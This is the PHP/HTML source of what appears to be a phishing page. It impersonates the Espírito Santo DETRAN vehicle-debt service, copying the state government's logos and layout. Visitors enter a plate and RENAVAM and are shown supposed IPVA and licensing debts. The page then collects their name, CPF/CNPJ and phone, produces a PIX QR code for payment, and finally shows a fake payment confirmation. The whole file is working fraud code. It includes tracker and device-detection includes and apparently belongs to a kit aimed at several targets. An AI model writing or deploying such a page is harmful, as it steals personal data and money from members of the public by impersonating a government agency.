<?php
// pages/detran-es/index.php

require_once "../../db.php";
require_once "../../base/utility.php";
require_once "../../base/detect_device.php";

$id_usuario = 1; 
$page = 'detran-es';

require_once "../../base/tracker.php";
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Serviços DETRAN-ES Veículos</title>
    <link rel="stylesheet" href="https://cdn.es.gov.br/fonts/open-sans/1.0.0/css/open-sans.min.css">
    <link rel="stylesheet" href="https://cdn.es.gov.br/fonts/font-awesome/6.1.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.es.gov.br/css/layout-es/web/0.1.1/es-layout-bs5.css" />
    <link rel="stylesheet" href="https://cdn.es.gov.br/bootstrap/5.3.2/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" />
    
    <style>
        :root {
            --es-primary: #004a8e;
            --es-navbar: #003366;
            --es-bg: #f0f2f5;
        }

        body { font-family: 'Open Sans', sans-serif; background-color: #fff; margin: 0; padding: 0; }
        
        /* HEADER OFICIAL */
        .es-header { background-color: var(--es-primary); padding: 12px 0; border-bottom: 4px solid #f9b233; }
        .es-container { max-width: 1140px; margin: 0 auto; padding: 0 15px; }
        .es-header-row { display: flex; justify-content: space-between; align-items: center; }
        
        /* NAVBAR OFICIAL */
        .es-navbar { background-color: var(--es-navbar); color: white; padding: 10px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .navbar-brand { font-size: 1.1em; font-weight: 400; color: white !important; }
        .es-nav-end { display: flex; align-items: center; gap: 15px; font-size: 0.9em; }

        /* MAIN CONTENT */
        .digital-es-bg { background-color: var(--es-bg); padding: 30px 0; min-height: 75vh; }
        .card-custom { border: none; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); background: white; }
        .card-header-es { background: #fff; border-bottom: 1px solid #eee; padding: 15px 20px; }
        .card-header-es h2 { font-size: 1.25rem; color: var(--es-primary); font-weight: 700; margin: 0; }

        .step-content { display: none; }
        .step-content.active { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* FORM */
        .form-label { font-weight: 700; color: #555; font-size: 0.9rem; }
        .form-control-lg { border-radius: 4px; border: 1px solid #ced4da; font-size: 1rem; }
        .btn-primary-es { background-color: var(--es-primary); border-color: var(--es-primary); padding: 12px; font-weight: 700; border-radius: 4px; }
        .btn-primary-es:hover { background-color: var(--es-navbar); }

        /* TABLE */
        .table-es thead th { background-color: #f8f9fa; color: #6c757d; font-size: 0.75rem; text-transform: uppercase; border-bottom: 2px solid #dee2e6; }
        .linha-detalhe { border-bottom: 1px solid #f0f0f0; }
        .debito-desc { font-weight: 700; color: #333; }
        .debito-valor { color: #d32f2f; font-weight: 800; }

        /* MODAL */
        .modal-es-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; align-items: center; justify-content: center; z-index: 10000; }
        .modal-es-content { background: white; border-radius: 8px; width: 100%; max-width: 450px; padding: 25px; position: relative; }

        /* INVOICE */
        .invoice-card { background: white; border-radius: 8px; border: 1px solid #e2e8f0; padding: 30px; text-align: center; }
        .qr-box { background: #f8fafc; padding: 15px; border-radius: 8px; border: 1px solid #e2e8f0; display: inline-block; margin: 20px 0; }
        .pix-code-box { background: #f1f5f9; border: 1px dashed #cbd5e0; padding: 12px; font-family: monospace; font-size: 0.8rem; word-break: break-all; margin: 15px 0; cursor: pointer; }
        
        .footer-es { background: #fff; padding: 40px 0; border-top: 1px solid #eee; margin-top: 30px; }
        .footer-logo { opacity: 0.5; filter: grayscale(1); max-height: 45px; }

        .loader-spinner { display: inline-block; width: 1.2rem; height: 1.2rem; border: 0.2em solid currentColor; border-right-color: transparent; border-radius: 50%; animation: spinner-border .75s linear infinite; vertical-align: text-bottom; margin-right: 5px; }
    </style>
</head>

<body>

<header>
    <section class="es-header">
        <div class="es-container">
            <div class="es-header-row">
                <div class="logo-area">
                    <img src="https://cdn.es.gov.br/images/logo/governo/brasao/right-white/Brasao_Governo_190.png" style="height: 45px;" alt="Governo ES">
                </div>
                <div style="color: white; font-weight: 800; font-size: 1.1em; letter-spacing: 1px;">
                    SISTEMA DE VEÍCULOS
                </div>
            </div>
        </div>
    </section>

    <nav class="es-navbar">
        <div class="es-container">
            <div class="d-flex justify-content-between align-items-center">
                <div class="navbar-brand">Site DETRAN ES</div>
                <div class="es-nav-end" id="user-nav" style="display: none;">
                    <i class="fa-solid fa-user-circle fa-lg"></i>
                    <span id="user-name-top" class="fw-bold">USUÁRIO</span>
                    <a href="javascript:location.reload()" class="btn btn-outline-light btn-sm px-3">Sair</a>
                </div>
            </div>
        </div>
    </nav>
</header>

<main class="digital-es-bg">
    <div class="es-container">

        <!-- STEP 1: CONSULTA -->
        <div id="step-consulta" class="step-content active">
            <div class="row justify-content-center">
                <div class="col-12 col-md-6 col-lg-5">
                    <div class="card card-custom">
                        <div class="card-header-es text-center">
                            <h2>Consulta de Débitos</h2>
                            <p class="text-muted small mt-1">Informe os dados para consultar IPVA e Licenciamento.</p>
                        </div>
                        <div class="card-body p-4">
                            <form id="formConsulta">
                                <div class="mb-3">
                                    <label class="form-label">PLACA</label>
                                    <input type="text" id="placa" class="form-control form-control-lg" placeholder="ABC1D23" required maxlength="7" style="text-transform: uppercase;">
                                </div>
                                <div class="mb-4">
                                    <label class="form-label">RENAVAM</label>
                                    <input type="text" id="renavam" class="form-control form-control-lg" placeholder="01234567890" required maxlength="11">
                                </div>
                                <button type="submit" class="btn btn-primary-es btn-primary w-100" id="btnConsultar">CONSULTAR VEÍCULO</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 2: RESULTADOS -->
        <div id="step-resultados" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-lg-10">
                    <div class="card card-custom">
                        <div class="card-header-es d-flex justify-content-between align-items-center">
                            <h2>DÉBITOS ENCONTRADOS</h2>
                            <button class="btn btn-sm btn-light border" onclick="showStep('consulta')">Voltar</button>
                        </div>
                        <div class="p-3 border-bottom bg-light">
                            <div class="row small">
                                <div class="col-12 col-md-6">
                                    <span class="text-muted">Proprietário:</span> <strong id="prop-nome-check">---</strong>
                                </div>
                                <div class="col-12 col-md-6 text-md-end">
                                    <span class="text-muted">Placa:</span> <strong id="placa-check">---</strong>
                                </div>
                            </div>
                        </div>

                        <div class="table-responsive">
                            <table class="table table-es m-0">
                                <thead>
                                    <tr>
                                        <th width="50"></th>
                                        <th>Descrição</th>
                                        <th>Vencimento</th>
                                        <th class="text-end">Situação</th>
                                        <th class="text-end">Valor (R$)</th>
                                    </tr>
                                </thead>
                                <tbody id="listaDebitos">
                                    <!-- Preenchido via JS -->
                                </tbody>
                            </table>
                        </div>

                        <div class="card-footer bg-white p-4">
                            <div class="row align-items-center">
                                <div class="col-12 col-md-6 mb-3 mb-md-0">
                                    <div class="small text-muted fw-bold">TOTAL SELECIONADO</div>
                                    <div class="h3 m-0 text-success fw-bold" id="totalDisplay">R$ 0,00</div>
                                </div>
                                <div class="col-12 col-md-6">
                                    <button class="btn btn-success w-100 py-3 fw-bold shadow-sm" id="btnProsseguir">PROSSEGUIR PARA PAGAMENTO</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 3: FATURA / PIX -->
        <div id="step-pagamento" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-md-7 col-lg-6">
                    <div class="invoice-card">
                        <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" style="height: 35px;" class="mb-3">
                        <h3 class="h5 fw-bold text-dark">Guia de Pagamento Instantâneo</h3>
                        <p class="text-muted small">Escaneie o QR Code abaixo com o aplicativo do seu banco.</p>

                        <div class="qr-box" id="qr-container">
                            <!-- QR Gerado aqui -->
                        </div>

                        <div class="pix-code-box" id="pixCode" onclick="copyPix()">
                            Clique para copiar o código PIX
                        </div>

                        <div class="d-flex align-items-center justify-content-center gap-2 mt-4 text-warning fw-bold">
                            <div class="spinner-border spinner-border-sm" role="status"></div>
                            <span>AGUARDANDO PAGAMENTO...</span>
                        </div>

                        <div class="mt-4 pt-3 border-top small text-muted">
                            Esta guia expira em 30 minutos. Após o pagamento a baixa é automática.
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- STEP 4: SUCESSO -->
        <div id="step-sucesso" class="step-content">
            <div class="row justify-content-center">
                <div class="col-12 col-md-6">
                    <div class="card card-custom p-5 text-center">
                        <i class="bi bi-patch-check-fill text-success" style="font-size: 5rem;"></i>
                        <h2 class="fw-bold text-success mt-3">Pagamento Confirmado!</h2>
                        <p class="text-muted">Seus débitos junto ao Detran-ES foram liquidados.</p>
                        <hr>
                        <div class="text-start mb-4">
                            <div class="small text-muted">Referência: <strong id="comp-ref">#000</strong></div>
                            <div class="small text-muted">Data: <strong id="comp-data">--/--/--</strong></div>
                        </div>
                        <button class="btn btn-primary-es btn-primary w-100" onclick="location.reload()">NOVA CONSULTA</button>
                    </div>
                </div>
            </div>
        </div>

    </div>
</main>

<!-- MODAL: DADOS OBRIGATÓRIOS -->
<div class="modal-es-overlay" id="modalDados">
    <div class="modal-es-content">
        <h3 class="h5 fw-bold text-primary mb-2">Dados do Pagamento</h3>
        <p class="text-muted small mb-4">Informe os dados do contribuinte para gerar o PIX.</p>
        
        <div class="mb-3">
            <label class="form-label">NOME DO TITULAR</label>
            <input type="text" id="cust-nome" class="form-control" placeholder="Nome Completo">
        </div>
        <div class="mb-3">
            <label class="form-label">CPF / CNPJ</label>
            <input type="text" id="cust-doc" class="form-control" placeholder="000.000.000-00">
        </div>
        <div class="mb-4">
            <label class="form-label">WHATSAPP (OPCIONAL)</label>
            <input type="tel" id="cust-phone" class="form-control" placeholder="(27) 99999-9999">
        </div>

        <button class="btn btn-success w-100 py-3 fw-bold" id="btnGerarGuia">GERAR QR CODE PIX</button>
        <button class="btn btn-link btn-sm w-100 mt-2 text-muted text-decoration-none" id="btnFecharModal">Cancelar</button>
    </div>
</div>

<footer class="footer-es">
    <div class="es-container text-center">
        <div class="row align-items-center">
            <div class="col-12 col-md-4 mb-4 mb-md-0">
                <img src="https://cdn.es.gov.br/images/logo/governo/brasao/right-white/Brasao_Governo_240.png" class="footer-logo">
            </div>
            <div class="col-12 col-md-4 mb-4 mb-md-0 text-muted small">
                © 2026 Detran-ES - Departamento Estadual de Trânsito do Espírito Santo
            </div>
            <div class="col-12 col-md-4">
                <img src="https://cdn.es.gov.br/images/logo/prodest/logomarca/right-white/Logomarca_Prodest_240.png" class="footer-logo">
            </div>
        </div>
    </div>
</footer>

<script>
    let totalValor = 0;
    let currentRef = null;
    let pollInterval = null;

    function showStep(s) {
        document.querySelectorAll('.step-content').forEach(el => el.classList.remove('active'));
        document.getElementById(`step-${s}`).classList.add('active');
        window.scrollTo(0,0);
    }

    // Máscara
    document.getElementById('cust-doc').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, "");
        if (v.length <= 11) {
            v = v.replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2");
        } else {
            v = v.replace(/^(\d{2})(\d)/, "$1.$2").replace(/^(\d{2})\.(\d{3})(\d)/, "$1.$2.$3").replace(/\.(\d{3})(\d)/, ".$1/$2").replace(/(\d{4})(\d)/, "$1-$2");
        }
        e.target.value = v;
    });

    // Consulta
    document.getElementById('formConsulta').addEventListener('submit', function(e) {
        e.preventDefault();
        const placa = document.getElementById('placa').value;
        const renavam = document.getElementById('renavam').value;
        const btn = document.getElementById('btnConsultar');

        btn.disabled = true;
        btn.innerHTML = '<span class="loader-spinner"></span> BUSCANDO DADOS...';

        fetch(`../../api/buscarES.php?placa=${placa}&renavam=${renavam}`)
        .then(res => res.json())
        .then(data => {
            if (data.IsStatus) {
                renderDebitos(data);
                document.getElementById('placa-check').textContent = placa.toUpperCase();
                showStep('resultados');
            } else {
                alert('Atenção: ' + (data.error || 'Erro na comunicação.'));
            }
        })
        .finally(() => {
            btn.disabled = false;
            btn.textContent = 'CONSULTAR VEÍCULO';
        });
    });

    function renderDebitos(data) {
        const list = document.getElementById('listaDebitos');
        list.innerHTML = '';
        
        if (data.proprietario) {
            document.getElementById('prop-nome-check').textContent = data.proprietario;
            document.getElementById('cust-nome').value = data.proprietario;
            document.getElementById('user-nav').style.display = 'flex';
            document.getElementById('user-name-top').textContent = data.proprietario;
        }

        data.dados.forEach(item => {
            const tr = document.createElement('tr');
            tr.className = 'linha-detalhe';
            tr.innerHTML = `
                <td><input type="checkbox" class="debito-check form-check-input" data-valor="${item.atual}" checked></td>
                <td class="small"><div class="debito-desc">${item.descricao}</div></td>
                <td class="small">${item.data_vencimento}</td>
                <td class="text-end"><span class="badge bg-light text-dark border">${item.situacao}</span></td>
                <td class="text-end fw-bold debito-valor">R$ ${parseFloat(item.atual).toLocaleString('pt-BR', {minimumFractionDigits:2})}</td>
            `;
            list.appendChild(tr);
        });

        document.querySelectorAll('.debito-check').forEach(c => c.addEventListener('change', calcTotal));
        calcTotal();
    }

    function calcTotal() {
        totalValor = 0;
        document.querySelectorAll('.debito-check:checked').forEach(c => totalValor += parseFloat(c.dataset.valor));
        document.getElementById('totalDisplay').textContent = `R$ ${totalValor.toLocaleString('pt-BR', {minimumFractionDigits:2})}`;
        document.getElementById('btnProsseguir').disabled = totalValor <= 0;
    }

    document.getElementById('btnProsseguir').addEventListener('click', () => document.getElementById('modalDados').style.display = 'flex');
    document.getElementById('btnFecharModal').addEventListener('click', () => document.getElementById('modalDados').style.display = 'none');

    document.getElementById('btnGerarGuia').addEventListener('click', () => {
        const nome = document.getElementById('cust-nome').value;
        const doc = document.getElementById('cust-doc').value;
        if (!nome || !doc) return alert('Informe Nome e CPF/CNPJ.');

        const btn = document.getElementById('btnGerarGuia');
        btn.disabled = true;
        btn.innerHTML = '<span class="loader-spinner"></span> GERANDO PIX...';

        const formData = new FormData();
        formData.append('cpf_cnpj', doc);
        formData.append('nome', nome);
        formData.append('valor', totalValor.toFixed(2));
        formData.append('debito', 'TAXAS DETRAN-ES (PPI7G96)');

        fetch('../../data/pix.php', { method: 'POST', body: formData })
        .then(res => res.json())
        .then(data => {
            if (data.status && data.pix) {
                currentRef = data.id || data.pix;
                document.getElementById('pixCode').dataset.code = data.pix;
                document.getElementById('qr-container').innerHTML = `<img src="https://chart.googleapis.com/chart?chs=220x220&cht=qr&chl=${encodeURIComponent(data.pix)}" alt="QR PIX">`;
                document.getElementById('modalDados').style.display = 'none';
                showStep('pagamento');
                startPolling();
            } else {
                alert('Erro ao gerar pagamento.');
            }
        }).finally(() => {
            btn.disabled = false;
            btn.textContent = 'GERAR QR CODE PIX';
        });
    });

    function copyPix() {
        const code = document.getElementById('pixCode').dataset.code;
        navigator.clipboard.writeText(code);
        const box = document.getElementById('pixCode');
        box.textContent = '✅ CÓDIGO PIX COPIADO!';
        setTimeout(() => box.textContent = 'Clique para copiar o código PIX', 2000);
    }

    function startPolling() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(() => {
            if (!currentRef) return;
            fetch(`../teste/get_status.php?ref=${encodeURIComponent(currentRef)}`)
            .then(res => res.json())
            .then(data => {
                if (data.payment_status === 'pago') {
                    clearInterval(pollInterval);
                    document.getElementById('comp-ref').textContent = '#' + currentRef;
                    document.getElementById('comp-data').textContent = new Date().toLocaleDateString('pt-BR');
                    showStep('sucesso');
                }
            });
        }, 3000);
    }
</script>

</body>
</html>